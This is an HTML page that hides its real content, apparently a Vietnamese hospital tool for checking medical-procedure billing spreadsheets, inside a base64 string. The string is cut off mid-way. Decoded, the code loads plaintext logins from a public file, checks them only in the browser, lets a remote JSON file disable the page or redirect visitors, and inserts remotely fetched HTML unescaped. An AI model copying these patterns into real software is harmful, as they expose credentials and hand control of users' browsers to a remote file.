<!-- 

///////////////////////////////////////////////
/////Code được viết bởi Chauhuynh0104/////////
////http://fb.com/chauhuynh0104//////////////
/////////////079.567.9350///////////////////
///Vui lòng tôn trọng bản quyền tác giả////
/////////Không xoá dòng này //////////////
/////////////////////////////////////////

!-->
<!DOCTYPE html>
<html lang="vi">
<head><meta charset="UTF-8"><title>Thủ Thuật</title></head>
<body>
<script>
  const base64 = "PCEtLSANCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy9Db2RlIMSRxrDhu6NjIHZp4bq/dCBi4bufaSBDaGF1aHV5bmgwMTA0Ly8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vL2h0dHA6Ly9mYi5jb20vY2hhdWh1eW5oMDEwNC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLzA3OS41NjcuOTM1MC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy9WdWkgbMOybmcgdMO0biB0cuG7jW5nIGLhuqNuIHF1eeG7gW4gdMOhYyBnaeG6oy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy9LaMO0bmcgeG/DoSBkw7JuZyBuw6B5IC8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KIS0tPg0KPCFET0NUWVBFIGh0bWw+DQoNCjxodG1sIGxhbmc9InZpIj4NCjxoZWFkPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1JbnRlcjp3Z2h0QDQwMDs2MDA7NzAwJmFtcDtkaXNwbGF5PXN3YXAiIHJlbD0ic3R5bGVzaGVldCIvPg0KPGxpbmsgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZm9udC1hd2Vzb21lLzYuNC4wL2Nzcy9hbGwubWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ii8+DQo8bWV0YSBjaGFyc2V0PSJ1dGYtOCIvPg0KPG1ldGEgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCIgbmFtZT0idmlld3BvcnQiLz4NCjx0aXRsZT5LaeG7g20gVHJhIFRo4bunIFRodeG6rXQgWSBU4bq/PC90aXRsZT4NCjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jaGF1aHV5bmgwMTA0LmdpdGh1Yi5pby9neW0vZ2lhb2RpZW4uY3NzIj4NCjxzY3JpcHQ+DQogICAgYXN5bmMgZnVuY3Rpb24gY2hlY2tBY2Nlc3MoKSB7DQogICAgICAgIGNvbnN0IGpzb25VcmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2RyY2hhdS5qc29uJzsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKGpzb25VcmwpOw0KICAgICAgICAgICAgaWYgKCFyZXMub2spIHRocm93IG5ldyBFcnJvcignS2jDtG5nIHRo4buDIHThuqNpIGZpbGUgSlNPTicpOw0KICAgICAgICAgICAgY29uc3QgY29uZmlnID0gYXdhaXQgcmVzLmpzb24oKTsNCg0KICAgICAgICAgICAgaWYgKCFjb25maWcuQUNDRVNTX0FMTE9XRUQpIHsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmlubmVySFRNTCA9IGA8ZGl2IHN0eWxlPSJwYWRkaW5nOjUwcHg7dGV4dC1hbGlnbjpjZW50ZXI7Y29sb3I6cmVkO2ZvbnQtc2l6ZToyMHB4Ij4NCiAgICAgICAgICAgICAgICAgICAgPGgyPkLhuqJPIFRSw4wgSOG7hiBUSOG7kE5HPC9oMj4NCiAgICAgICAgICAgICAgICAgICAgPHA+JHtjb25maWcuTUVTU0FHRX08L3A+DQogICAgICAgICAgICAgICAgICAgICR7Y29uZmlnLlJFRElSRUNUX1VSTCA/IGA8cD5T4bq9IGNodXnhu4NuIGjGsOG7m25nIHNhdSA8c3BhbiBpZD0nY291bnRkb3duJz41PC9zcGFuPiBnacOieS4uLjwvcD5gIDogJyd9DQogICAgICAgICAgICAgICAgPC9kaXY+YDsNCiAgICAgICAgICAgICAgICBpZiAoY29uZmlnLlJFRElSRUNUX1VSTCkgew0KICAgICAgICAgICAgICAgICAgICBsZXQgc2Vjb25kcyA9IDU7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHRpbWVyID0gc2V0SW50ZXJ2YWwoKCkgPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgc2Vjb25kcy0tOw0KICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2NvdW50ZG93bicpLmlubmVyVGV4dCA9IHNlY29uZHM7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoc2Vjb25kcyA8PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbCh0aW1lcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBjb25maWcuUkVESVJFQ1RfVVJMOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9LCAxMDAwKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSBgPGRpdiBzdHlsZT0ncGFkZGluZzo1MHB4O3RleHQtYWxpZ246Y2VudGVyO2NvbG9yOnJlZCc+DQogICAgICAgICAgICAgICAgPGgyPktIw5RORyBU4bqiSSDEkMav4buiQyBD4bqkVSBIw4xOSDwvaDI+PHA+TOG7l2kgdHJ1eSBj4bqtcCBraGkga+G6v3QgbuG7kWkgbeG6oW5nLjxici8+IFZ1aSBsw7JuZyBraeG7g20gdHJhIGzhuqFpIMSRxrDhu51uZyB0cnV54buBbiBpbnRlcm5ldC48L3A+DQogICAgICAgICAgICA8L2Rpdj5gOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgYXN5bmMgZnVuY3Rpb24gbG9hZEFjY291bnRzRnJvbVRYVCgpIHsNCiAgICAgICAgY29uc3QgdHh0VXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi90a2sudHh0JzsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2godHh0VXJsKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7DQogICAgICAgIGNvbnN0IGFjY291bnRzID0ge307DQogICAgICAgIHRleHQuc3BsaXQoJ1xuJykuZm9yRWFjaChsaW5lID0+IHsNCiAgICAgICAgICAgIGNvbnN0IFt1LCBwXSA9IGxpbmUudHJpbSgpLnNwbGl0KCc6Jyk7DQogICAgICAgICAgICBpZiAodSAmJiBwKSBhY2NvdW50c1t1XSA9IHA7DQogICAgICAgIH0pOw0KICAgICAgICByZXR1cm4gYWNjb3VudHM7DQogICAgfQ0KDQogICAgYXN5bmMgZnVuY3Rpb24gZW5hYmxlTG9naW4oYWNjb3VudHMpIHsNCiAgICAgICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luQnRuJyk7DQogICAgICAgIGNvbnN0IHVzZXJJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0Jyk7DQogICAgICAgIGNvbnN0IHBhc3NJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0Jyk7DQogICAgICAgIGNvbnN0IGVycm9yRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luRXJyb3InKTsNCg0KICAgICAgICBidG4uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgICAgICAgICBjb25zdCB1c2VyID0gdXNlcklucHV0LnZhbHVlLnRyaW0oKTsNCiAgICAgICAgICAgIGNvbnN0IHBhc3MgPSBwYXNzSW5wdXQudmFsdWUudHJpbSgpOw0KICAgICAgICAgICAgaWYgKGFjY291bnRzW3VzZXJdICYmIGFjY291bnRzW3VzZXJdID09PSBwYXNzKSB7DQogICAgICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbSgnbWVkVXNlcicsIHVzZXIpOw0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LnJlbW92ZSgnbG9naW4tcGFnZScpOw0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpblNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWluQ29udGVudCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgICAgIGVycm9yRGl2LnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGVycm9yRGl2LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9KTsNCiAgICB9DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgaWYgKGFsbFByb2NlZHVyZXMubGVuZ3RoID4gMCkgew0KICAgICAgICBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhhbGxQcm9jZWR1cmVzKTsNCiAgICAgICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KICAgIH0NCn0pOw0KfSk7DQoNCiB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGFzeW5jICgpID0+IHsNCiAgY29uc3QgYWxsb3cgPSBhd2FpdCBjaGVja0FjY2VzcygpOw0KICBpZiAoIWFsbG93KSByZXR1cm47DQogIC8vIENo4buJIGtp4buDbSB0cmEgxJHEg25nIG5o4bqtcCDEkcOjIGzGsHU7IEtIw5RORyB04bqjaSBydWxlL3Byb2NlZHVyZXMg4bufIMSRw6J5DQogIGNoZWNrU2F2ZWRMb2dpbigpOw0KfSk7DQoNCjwvc2NyaXB0Pg0KDQoNCg0KDQo8L2hlYWQ+DQo8Ym9keT4NCjwhLS0gVEhFTUUgUElDS0VSIC0tPg0KPGRpdiBpZD0idGhlbWVQaWNrZXIiIGNsYXNzPSJ0aGVtZS1waWNrZXIiIHRpdGxlPSJDaOG7jW4gbcOgdSBjaOG7pyDEkeG7gSBnaWFvIGRp4buHbiI+DQogDQogDQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJkZWZhdWx0IiBzdHlsZT0iLS1zd2F0Y2g6IzM0OThkYiIgYXJpYS1sYWJlbD0iTeG6t2MgxJHhu4tuaCAoWGFuaCBkxrDGoW5nKSI+PC9idXR0b24+DQogIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0idGhlbWUtc3dhdGNoIiBkYXRhLXRoZW1lPSJvcmFuZ2UiICBzdHlsZT0iLS1zd2F0Y2g6I0ZGNjYwMCIgYXJpYS1sYWJlbD0iTcOgdSBjYW0iPjwvYnV0dG9uPg0KICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InRoZW1lLXN3YXRjaCIgZGF0YS10aGVtZT0icmVkIiAgICAgc3R5bGU9Ii0tc3dhdGNoOiNGRjAwMDAiIGFyaWEtbGFiZWw9Ik3DoHUgxJHhu48iPjwvYnV0dG9uPg0KICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9InRoZW1lLXN3YXRjaCIgZGF0YS10aGVtZT0iZ3JlZW4iICAgc3R5bGU9Ii0tc3dhdGNoOiMwMEFBMDAiIGFyaWEtbGFiZWw9Ik3DoHUgeGFuaCBsw6EiPjwvYnV0dG9uPg0KICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGlkPSJkYXJrVG9nZ2xlIiBjbGFzcz0idGhlbWUtZGFyay10b2dnbGUiIG9uY2xpY2s9InRvZ2dsZURhcmtNb2RlKCkiIGFyaWEtbGFiZWw9IkLhuq10L1Thuq90IGNo4bq/IMSR4buZIHThu5FpIj4NCiAgICA8c3BhbiBpZD0iZGFya0ljb24iPjxzbWFsbD7wn4yZPC9zbWFsbD48L3NwYW4+IDxzcGFuIGlkPSJkYXJrVGV4dCI+VOG7kWk8L3NwYW4+DQogIDwvYnV0dG9uPg0KICANCjwvZGl2Pg0KDQoNCg0KDQo8c2NyaXB0Pg0KICAgICAgZnVuY3Rpb24gdG9nZ2xlRGFya01vZGUoKSB7DQogICAgICAgIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5ib2R5Ow0KICAgICAgICBjb25zdCBpY29uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRhcmtJY29uIik7DQogICAgICAgIGNvbnN0IHRleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZGFya1RleHQiKTsNCiAgICAgICAgYm9keS5jbGFzc0xpc3QudG9nZ2xlKCJkYXJrLW1vZGUiKTsNCiAgICAgICAgY29uc3QgaXNEYXJrID0gYm9keS5jbGFzc0xpc3QuY29udGFpbnMoImRhcmstbW9kZSIpOw0KICAgICAgICBpY29uLnRleHRDb250ZW50ID0gaXNEYXJrID8gIuKYgO+4jyIgOiAi8J+MmSI7DQogICAgICAgIHRleHQudGV4dENvbnRlbnQgPSBpc0RhcmsgPyAiU8OhbmciIDogIlThu5FpIjsNCiAgICAgIH0NCiAgICA8L3NjcmlwdD4NCjxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCkgPT4gew0KLy8gTOG6pXkgY8OhYyBwaOG6p24gdOG7rQ0KICAgICAgICAgICAgY29uc3QgdHJpZ2dlckJ1dHRvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd0cmlnZ2VyQnV0dG9uJyk7DQogICAgICAgICAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQoNCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIHBo4bqnbiB04butIGPDsyB04buTbiB04bqhaSBraMO0bmcNCiAgICAgICAgICAgIGlmICghdHJpZ2dlckJ1dHRvbiB8fCAhZmlsZUlucHV0KSB7DQogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2k6IEtow7RuZyB0w6xtIHRo4bqleSB0cmlnZ2VyQnV0dG9uIGhv4bq3YyBmaWxlSW5wdXQnKTsNCiAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIFRow6ptIHPhu7Ega2nhu4duIGNsaWNrIGNobyBidXR0b24NCiAgICAgICAgICAgIHRyaWdnZXJCdXR0b24uYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgICAgICAgICAgICAgZmlsZUlucHV0LmNsaWNrKCk7IC8vIEvDrWNoIGhv4bqhdCBpbnB1dCBmaWxlDQogICAgICAgICAgICB9KTsNCg0KICAgICAgICB9KTsNCg0KPC9zY3JpcHQ+DQoNCjxkaXYgY2xhc3M9ImNvbnRhaW5lciI+DQo8ZGl2IGNsYXNzPSJsb2dpbi1zZWN0aW9uIiBpZD0ibG9naW5TZWN0aW9uIj4NCjxoMiBjbGFzcz0ibG9naW4tdGl0bGUiPsSQxIJORyBOSOG6rFAgSOG7hiBUSOG7kE5HPC9oMj4NCjxpbnB1dCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJ1c2VybmFtZUlucHV0IiBwbGFjZWhvbGRlcj0iVMOqbiDEkcSDbmcgbmjhuq1wIiB0eXBlPSJ0ZXh0Ii8+DQo8aW5wdXQgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0icGFzc3dvcmRJbnB1dCIgcGxhY2Vob2xkZXI9Ik3huq10IGto4bqpdSIgdHlwZT0icGFzc3dvcmQiLz4NCjxici8+PGJ1dHRvbiBjbGFzcz0iYnRuIiBpZD0ibG9naW5CdG4iPsSQxINuZyBuaOG6rXA8L2J1dHRvbj4NCjxkaXYgY2xhc3M9ImxvZ2luLWVycm9yIiBpZD0ibG9naW5FcnJvciI+VMOqbiDEkcSDbmcgbmjhuq1wIGhv4bq3YyBt4bqtdCBraOG6qXUga2jDtG5nIMSRw7puZzwvZGl2Pg0KPC9kaXY+DQo8ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiIGlkPSJtYWluQ29udGVudCI+DQo8ZGl2IGNsYXNzPSJ0b3AtYnV0dG9uLWdyb3VwIj4NCjxidXR0b24gb25jbGljaz0ic2hvd0Ryb3Bib3hQYW5lbCgpIiBjbGFzcz0iYnRuIj5QYW5lbDwvYnV0dG9uPg0KDQogIDxidXR0b24gb25jbGljaz0id2luZG93LmxvY2F0aW9uLnJlbG9hZCgpOyIgY2xhc3M9ImJ0biI+WG/DoSBDYWNoZTwvYnV0dG9uPg0KICA8YnV0dG9uIGNsYXNzPSJidG4iaWQ9ImxvZ291dEJ0biI+xJDEg25nIHh14bqldDwvYnV0dG9uPg0KPC9kaXY+DQoNCg0KPGgxPiA8YSBocmVmPSJodHRwczovL2ZiLmNvbS9jaGF1aHV5bmgwMTA0IiBzdHlsZT0iYWxsOiB1bnNldDsgY3Vyc29yOiBwb2ludGVyOyIgdGFyZ2V0PSJfYmxhbmsiPktp4buDbSBUcmEgVGjhu6cgVGh14bqtdCBZIFThur88L2E+PC9oMT4NCjxkaXYgY2xhc3M9Imxpc3QxIiBzdHlsZT0iZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiA4cHg7Ij4NCjxpIGNsYXNzPSJmYSBmYS1idWxsaG9ybiI+PC9pPg0KPGI+PGZvbnQgY29sb3I9InJlZCI+VGjDtG5nIGLDoW86PC9mb250PjwvYj4NCjxkaXYgY2xhc3M9InNjcm9sbGluZy10ZXh0IiBzdHlsZT0iZmxleDogMTsgb3ZlcmZsb3c6IGhpZGRlbjsiPg0KPGRpdiBjbGFzcz0ic2Nyb2xsaW5nLWNvbnRlbnQiIGlkPSJub2lkdW5nIj4NCg0KPC9kaXY+DQo8L2Rpdj4NCjwvZGl2Pg0KPHNjcmlwdD4NCg0KDQpmZXRjaCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL3Rob25nYmFvLnR4dCcpDQogIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkNCiAgLnRoZW4oZGF0YSA9PiB7DQogICAgY29uc3QgZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbm9pZHVuZycpOw0KICAgIGVsLmlubmVySFRNTCA9IGRhdGE7DQoNCiAgICAvLyBUxINuZyDEkeG7mSBkw6BpIG7hu5lpIGR1bmcgxJHhu4MgxJHhuqNtIGLhuqNvIGN14buZbg0KICAgIGVsLnN0eWxlLmRpc3BsYXkgPSAnaW5saW5lLWJsb2NrJzsNCiAgICBlbC5zdHlsZS5taW5XaWR0aCA9ICcxMDAlJzsNCg0KICAgIC8vIFJlc2V0IGFuaW1hdGlvbiB0byBmb3JjZSByZWZsb3cNCiAgICBlbC5zdHlsZS5hbmltYXRpb24gPSAnbm9uZSc7DQogICAgdm9pZCBlbC5vZmZzZXRXaWR0aDsNCiAgICBlbC5zdHlsZS5hbmltYXRpb24gPSAnc2Nyb2xsLWxlZnQgMTBzIGxpbmVhciBpbmZpbml0ZSc7DQogIH0pDQogIC5jYXRjaChlcnJvciA9PiB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25vaWR1bmcnKS50ZXh0Q29udGVudCA9ICdLaMO0bmcgdGjhu4MgdOG6o2kgbuG7mWkgZHVuZy4nOw0KICAgIGNvbnNvbGUuZXJyb3IoZXJyb3IpOw0KICB9KTsNCg0KDQo8L3NjcmlwdD4NCjxkaXYgY2xhc3M9InVwbG9hZC1zZWN0aW9uIj48ZGl2IGNsYXNzPSJtYWluYmxvayI+DQoNCjxpbnB1dCBhY2NlcHQ9Ii54bHN4LCAueGxzLCAuY3N2IiBpZD0iZmlsZUlucHV0IiBzdHlsZT0iZGlzcGxheTpub25lIiB0eXBlPSJmaWxlIi8+DQo8YnV0dG9uIGNsYXNzPSJidG4iIGlkPSJ0cmlnZ2VyQnV0dG9uIj48aSBjbGFzcz0iZmFzIGZhLWZpbGUtdXBsb2FkIj48L2k+IENo4buNbiBmaWxlIHRo4bunIGPDtG5nPC9idXR0b24+DQo8YnIvPjxici8+DQo8aW5wdXQgZGlyZWN0b3J5PSIiIGlkPSJmb2xkZXJJbnB1dCIgbXVsdGlwbGU9IiIgc3R5bGU9ImRpc3BsYXk6bm9uZSIgdHlwZT0iZmlsZSIgd2Via2l0ZGlyZWN0b3J5PSIiLz4NCjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImZvbGRlckJ0biI+PGkgY2xhc3M9ImZhcyBmYS1mb2xkZXItb3BlbiI+PC9pPiBDaOG7jW4gdGjGsCBt4bulYyAoVOG7sSDEkeG7mW5nIHTDrG0gZmlsZSk8L2J1dHRvbj4NCjxkaXYgaWQ9InNjYW5TdGF0dXMiIHN0eWxlPSJtYXJnaW4tdG9wOjEwcHg7Y29sb3I6IzM0OThkYjtmb250LXdlaWdodDpib2xkIj48L2Rpdj4NCg0KDQo8bGFiZWw+DQo8aW5wdXQgbmFtZT0idGltZU9wdGlvbiIgdHlwZT0icmFkaW8iIHZhbHVlPSI3OjAwIi8+IA0KICAgICAgICAgICAgICAgICAgICAgICAgR+G7o2kgw70gdOG7qyAwNzowMA0KICAgICAgICAgICAgICAgICAgICA8L2xhYmVsPg0KPGxhYmVsPg0KPGlucHV0IGNoZWNrZWQ9IiIgbmFtZT0idGltZU9wdGlvbiIgdHlwZT0icmFkaW8iIHZhbHVlPSI3OjMwIi8+IA0KICAgICAgICAgICAgICAgICAgICAgICAgR+G7o2kgw70gdOG7qyAwNzozMA0KICAgICAgICAgICAgICAgICAgICA8L2xhYmVsPg0KPGJyLz48YnIvPg0KDQogIDxsYWJlbCBzdHlsZT0ibWFyZ2luLXJpZ2h0OiAxMHB4OyI+DQo8aW5wdXQgY2hlY2tlZD0iMSIgaWQ9Imlnbm9yZUFkamFjZW50Q2hlY2tib3giIHR5cGU9ImNoZWNrYm94Ii8+DQo8c3BhbiBjbGFzcz0iY2h1LXRoaWNoIj5C4buPIHF1YSB0aOG7pyB0aHXhuq10IGxp4buBbiBr4buBPHNwYW4gY2xhc3M9Im5vaS1kdW5nIj5WRDogOGgwMC04aDMwIHhvYSBiw7NwLiAwOGgzMC0wOGg1MCDEkWnhu4duIGNow6JtLiBsacOqbiB0aeG6v3AgbcOgIGtvIGPDoWNoIDEgcGjDunQgPC9zcGFuPjwvc3Bhbj4NCjwvbGFiZWw+DQoNCiAgPGxhYmVsIHN0eWxlPSJtYXJnaW4tcmlnaHQ6IDEwcHg7Ij4NCjxpbnB1dCBpZD0ic2hvd01vcmVTdWdnZXN0aW9uc0NoZWNrYm94IiB0eXBlPSJjaGVja2JveCIvPiANCiAgICAgICAgSGnhu4NuIHRo4buLIDYga2h1bmcgZ2nhu50gZ+G7o2kgw70gICAgICAgICANCiAgICA8L2xhYmVsPg0KDQo8bGFiZWw+DQo8aW5wdXQgaWQ9InNob3dEb2N0b3JDaGVja2JveCIgdHlwZT0iY2hlY2tib3giLz4gDQogICAgICAgIEhp4buDbiB0aOG7iyBCw6FjIHPEqSBjaOG7iSDEkeG7i25oDQogICAgPC9sYWJlbD4NCjxici8+PGJyLz4NCjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9ImFuYWx5emVCdG4iPktp4buDbSBUcmE8L2J1dHRvbj4NCg0KDQoNCg0KDQoNCg0KDQoNCjxzY3JpcHQ+DQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24gKCkgew0KICAgIGNvbnN0IGZpbGUgPSB0aGlzLmZpbGVzWzBdOw0KICAgIGlmIChmaWxlKSB7DQogICAgICAgIGNvbnN0IHN0YXR1cyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzY2FuU3RhdHVzJyk7DQogICAgICAgIHN0YXR1cy5pbm5lckhUTUwgPSBgPGkgY2xhc3M9ImZhcyBmYS1maWxlIj48L2k+xJDDoyBjaOG7jW4gZmlsZTogPGI+JHtmaWxlLm5hbWV9PC9iPmA7DQogICAgICAgIHN0YXR1cy5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgc3RhdHVzLnN0eWxlLmNvbG9yID0gJyMyYzNlNTAnOw0KICAgIH0NCn0pOw0KDQo8L3NjcmlwdD4NCjxkaXYgaWQ9InNjYW5TdGF0dXMiIHN0eWxlPSJtYXJnaW4tdG9wOjEwcHg7IGNvbG9yOiMyYzNlNTA7IGZvbnQtd2VpZ2h0OmJvbGQ7IGRpc3BsYXk6IG5vbmU7Ij48L2Rpdj4NCjxici8+DQo8c3BhbiBzdHlsZT0iZm9udC1zaXplOiAxMnB4OyI+PGk+UGjhuqduIG3hu4FtIMSRw7RpIGtoaSBjw7MgdGjhu4MgbeG6r2MgbOG7l2kuIFhpbiBow6N5IGtp4buDbSB0cmEgY8OhYyB0aMO0bmcgdGluIHF1YW4gdHLhu41uZy48L2k+PC9zcGFuPg0KPGRpdiBpZD0iZmlsZVJlcXVpcmVtZW50cyI+PC9kaXY+DQo8L2Rpdj48L2Rpdj4NCg0KDQo8IS0tIELhuq5UIMSQ4bqmVTogQuG6ok5HIEdJ4bucIFRS4buQTkcgVOG7qk5HIE5Hxq/hu5xJIC0tPg0KICA8YnV0dG9uIGlkPSJoZXJiVG9nZ2xlQnRuIiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJ0b2dnbGVIZXJiTGlzdCgpInN0eWxlPSJkaXNwbGF5Om5vbmUiPlPhuq9jIHRodeG7kWMgdGhhbmc8L2J1dHRvbj4NCiAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJ0b2dnbGVBdmFpbGFiaWxpdHkoKSIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+R2nhu50gdHLhu5FuZzwvYnV0dG9uPg0KDQo8ZGl2IGlkPSJhdmFpbGFiaWxpdHlUYWJsZSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7IG1hcmdpbi1ib3R0b206IDIwcHg7Ij4NCiA8ZGl2IGNsYXNzPSJtYWluYmxvayIgc3R5bGU9Im1hcmdpbi1ib3R0b206IDEwcHg7IGRpc3BsYXk6bm9uZTsiIGlkPSJhdmFpbGFiaWxpdHlGaWx0ZXJCbG9jayI+DQogIDxsYWJlbCBmb3I9ImZpbHRlck9wZXJhdG9yIj5OZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQogIDxzZWxlY3QgaWQ9ImZpbHRlck9wZXJhdG9yIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvO21hcmdpbi1yaWdodDoyMHB4OyI+PC9zZWxlY3Q+DQoNCiAgPGxhYmVsIGZvcj0iZmlsdGVyRGF0ZSI+TmfDoHk6PC9sYWJlbD4NCiAgPHNlbGVjdCBpZD0iZmlsdGVyRGF0ZSIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzsiPjwvc2VsZWN0Pg0KPC9kaXY+DQoNCiAgPHRhYmxlIGNsYXNzPSJlcnJvci10Y